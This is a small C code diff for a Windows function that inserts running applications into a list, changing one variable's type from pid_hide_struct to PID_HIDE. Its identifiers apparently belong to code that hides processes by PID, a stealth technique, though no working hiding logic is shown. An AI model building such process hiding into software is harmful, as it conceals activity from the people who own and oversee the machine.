@@ -69,7 +69,7 @@ BOOL ApplicationInsertInList(WCHAR *proc_name, WCHAR *proc_desc, DWORD PID)
 {
 	DWORD i;
 	application_list_entry_struct *temp_array = NULL;
-	pid_hide_struct pid_hide = NULL_PID_HIDE_STRUCT;
+	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 	BOOL is_hidden = FALSE;
 
 	SET_PID_HIDE_STRUCT(pid_hide, PID);
